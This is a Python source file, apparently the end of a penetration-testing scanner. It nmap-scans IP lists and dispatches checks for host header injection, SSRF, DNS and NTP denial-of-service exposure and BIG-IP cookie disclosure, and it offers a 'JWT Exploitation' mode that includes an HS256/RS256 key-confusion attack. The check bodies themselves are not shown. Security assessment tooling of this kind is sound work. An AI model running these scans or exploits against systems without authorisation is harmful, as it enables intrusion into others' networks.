		VerboseServerBanner(IP, port, status, sessCookie)
		hostHeaderInjection(IP, port, status, sessCookie)
		allSecurityHeaders(IP, port, status, sessCookie)
		internalIPAddressDisclosure(IP, port, status, sessCookie)
		ssrf(IP, port, status, sessCookie)
		cprint ("\n[*] Network Vulnerability Check\n", 'white', attrs=['bold','underline'])
		ntpMode6(IP)
		



def nmap(IP):
	port = args.port 
	start1=time.time()
	import nmap

	if port:
		port = str(port)
	else:
		port=""
	argument = "-Pn -p80,443,8443,8080,53,{}".format(port)

	try:
		nm = nmap.PortScanner()
		nm.scan(IP, arguments=argument)

		
		p80 = nm[IP]['tcp'][80]
		#print(nm[IP]['tcp'][443])
		p443 = nm[IP]['tcp'][443]
		#print(nm[IP]['tcp'][8080])
		p8080 = nm[IP]['tcp'][8080]
		#print(nm[IP]['tcp'][8443])
		p8443 = nm[IP]['tcp'][8443]

		p53 = nm[IP]['tcp'][53]

		if p53.get("state") == "open":
			#print(p53, IP)
			dnsPortCheck.add(IP)
			storeOpenPorts.update({IP:"dns:53"})
			
		if p80.get("state") == "open":
			storeData = "{}:{}".format(p80.get("name"),"80")
			if storeOpenPorts.get(IP):
				newValue = "{},{}".format(str(storeOpenPorts.get(IP)), storeData)
				storeOpenPorts.update({IP:newValue})

			else:
				storeOpenPorts.update({IP:storeData})

		if p443.get("state") == "open":
			storeData = "{}:{}".format(p443.get("name"),"443")
			if storeOpenPorts.get(IP):
				newValue = "{},{}".format(str(storeOpenPorts.get(IP)), storeData)
				storeOpenPorts.update({IP:newValue})

			else:
				storeOpenPorts.update({IP:storeData})

		if p8080.get("state") == "open":
			storeData = "{}:{}".format(p8080.get("name"),"8080")
			if storeOpenPorts.get(IP):
				newValue = "{},{}".format(str(storeOpenPorts.get(IP)), storeData)
				storeOpenPorts.update({IP:newValue})

			else:
				storeOpenPorts.update({IP:storeData})

		if p8443.get("state") == "open":
			storeData = "{}:{}".format(p8443.get("name"),"8443")
			if storeOpenPorts.get(IP):
				newValue = "{},{}".format(str(storeOpenPorts.get(IP)), storeData)
				storeOpenPorts.update({IP:newValue})

			else:
				storeOpenPorts.update({IP:storeData})

	except Exception as e:
		# 
		replace = 1


	if port.strip() != "":
		
		if "," in port:
			port = port.split(",")
			#print(port)

			for i in port:
				pCustom = ""
				pCustom = nm[IP]['tcp'][int(i)]

				if pCustom.get("state") == "open":
					storeData = "{}:{}".format(pCustom.get("name"),i)
					if storeOpenPorts.get(IP):
						newValue = "{},{}".format(str(storeOpenPorts.get(IP)), storeData)
						storeOpenPorts.update({IP:newValue})

					else:
						storeOpenPorts.update({IP:storeData})

		else:
			pCustom = ""
			pCustom = nm[IP]['tcp'][int(port)]
			if pCustom.get("state") == "open":
				storeData = "{}:{}".format(pCustom.get("name"),port)
				if storeOpenPorts.get(IP):
					newValue = "{},{}".format(str(storeOpenPorts.get(IP)), storeData)
					storeOpenPorts.update({IP:newValue})

				else:
					storeOpenPorts.update({IP:storeData})



	end1 = time.time()
	#print("\nTotal Runtime of nmap: ")
	#print(end1 - start1)

  
def startScan(args, ip):
	
	listOfPorts = {}

	global sessCookie
	sessCookie = {}
	port = storeOpenPorts.get(ip)
	
	port = port.split(",")
	
	for i in port:
		port = i.split(":")
		listOfPorts.update({port[1]:port[0]})


	if args.cookie:
		tempCookie = str(args.cookie)
		
		if ";" in tempCookie:
			tempCookie = tempCookie.split(";")
		
		for i in tempCookie:
			tempCookie = i.split("=")
			sessCookie.update({tempCookie[0]:tempCookie[1]})

		#print(sessCookie)

	else:
		sessCookie = None


	ip = str(ip)
	for port, status in listOfPorts.items():

		cprint ("\n\nScanning: {}:{}".format(ip,port), 'yellow')

		if args.f:
			
			enumerate(ip, port, status, args, sessCookie)

		else:
			cprint ("\n[*] Custom Vulnerability Check\n", 'white', attrs=['bold','underline'])
			

			if "53" in port:
				if args.dns:
					if ip in dnsPortCheck:
						dnsDOS(ip)
						dnsCacheSnooping(ip)
					else:
				  		print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("DNS Port closed\n", 'yellow'))

			else:
				if args.m:
					allSecurityHeaders(ip, port, status, sessCookie)
				if args.hi:
					hostHeaderInjection(ip, port, status, sessCookie)
				if args.v:			
					VerboseServerBanner(ip, port, status, sessCookie)
				if args.big:
					BIGIPcookieInformationDisclosure(ip, port, status, sessCookie)
				if args.i:
					internalIPAddressDisclosure(ip, port, status, sessCookie)
				if args.ssl:
					ssl(ip, port, status, sessCookie)
				if args.ssrf:
					ssrf(ip, port, status, sessCookie)
				if args.ntp:
					ntpMode6(ip)
				
				'''
				if args.dns:

				
					if ip in dnsPortCheck:
						dnsDOS(ip)
						dnsCacheSnooping(ip)
					else:
				  		print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("DNS Port closed\n", 'yellow'))
				'''
  
def arguments(args):

	global proxyDict

	if args.proxy:
		
		proxyValHttp = "http://{}".format(args.proxy)
		proxyValHttps = "https://{}".format(args.proxy)

		proxyDict = { 
          "http"  : proxyValHttp, 
          "https" : proxyValHttps
        	}

		try:
			address = "https://www.google.com"
			proxyCheck = oneRequest(None, address, sessCookie)
		except Exception as e:
			replace = 1
			proxyError(e, "scan", sessCookie)
				
	else:
		proxyDict = {}

	ipStore = []
	with open(args.file) as f:
			
		for ip in f:
			ip = ip.strip()

			if ip == "":
				continue
			else:
				ipStore.append(ip)
	
	print (colored("\n\n<--", 'red', attrs=['bold']), colored(" Port Scan in Progress ", 'green', attrs=['bold']), colored("-->", 'red', attrs=['bold']))
	with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ello:
		ello.map(nmap, ipStore)
	
	for ips in storeOpenPorts:
		startScan(args, ips)



if len(sys.argv) < 3:

	sys.argv.append('--help')

parser = argparse.ArgumentParser()
scanner_Group = parser.add_argument_group('Network Scanning')
scanner_Group.add_argument('-file', help="file path with ip addresses to scan. Required argument for network scanning")
scanner_Group.add_argument('-port', help='scan custom port, use comma-seperated values for multiple ports')
scanner_Group.add_argument('-cookie', help='insert session cookie to scan authenticated pages')
scanner_Group.add_argument('-proxy', help='use an intercepting proxy, provide IP and Port number. eg. -proxy 127.0.0.1:8080')
scanner_Group.add_argument('-big', help='check if BIGIP cookie is present and whether it is vulnerable to information disclosure',  action="store_true")
scanner_Group.add_argument('-f', help='scan for all options given below',  action="store_true")
scanner_Group.add_argument('-m', help='check for any misconfigurations or missing security headers',  action="store_true")
scanner_Group.add_argument('-hi', help='check if application is vulnerable to Host Header Injection',  action="store_true")
scanner_Group.add_argument('-v', help='check if the application returns a verbose server banner',  action="store_true")
scanner_Group.add_argument('-i', help='check if the application discloses internal ip addresses',  action="store_true")
scanner_Group.add_argument('-ssl', help="check if there are ssl related vulnerabilities or misconfigurations",   action="store_true")
scanner_Group.add_argument('-ssrf', help="response based detection for server side request forgery",   action="store_true")
scanner_Group.add_argument('-ntp', help='check if the remote NTP server responds to mode 6 queries (DOS)',  action="store_true")
scanner_Group.add_argument('-dns', help='check for DNS vulnerabilities',  action="store_true")
jwt_Group = parser.add_argument_group('JWT Exploitation')
jwt_Group.add_argument('-jwt', help='input a JWT Token to check for JWT vulnerabilities')
jwt_Group.add_argument('-head', help='select if input value is a JWT Token in header',  action="store_true")
jwt_Group.add_argument('-c', help='select if input value is a JWT Token in cookie',  action="store_true")
jwt_Group.add_argument('-oc', help='input any other cookies required apart from the JWT token')
jwt_Group.add_argument('-url', help='input the endpoint URL')
jwt_Group.add_argument('-post', help='input POST data to be sent')
jwt_Group.add_argument('-csrf', help='add CSRF token header')
jwt_Group.add_argument('-public_key', help='filepath of public key: Exploit - JWTs Signed With the HS256 Algorithm And Using the RS256 Public Key')


global args
args = parser.parse_args()

if args.jwt:
	JWTExploitation(args)
else:
	arguments(args)

worksheetFill()
workbook.close() 
ipList = set()

end = time.time()
cprint("\nTotal Runtime of Script: ", 'yellow', attrs=['bold'])
cprint(end - start, 'white',attrs=['bold'])
os.system("stty sane")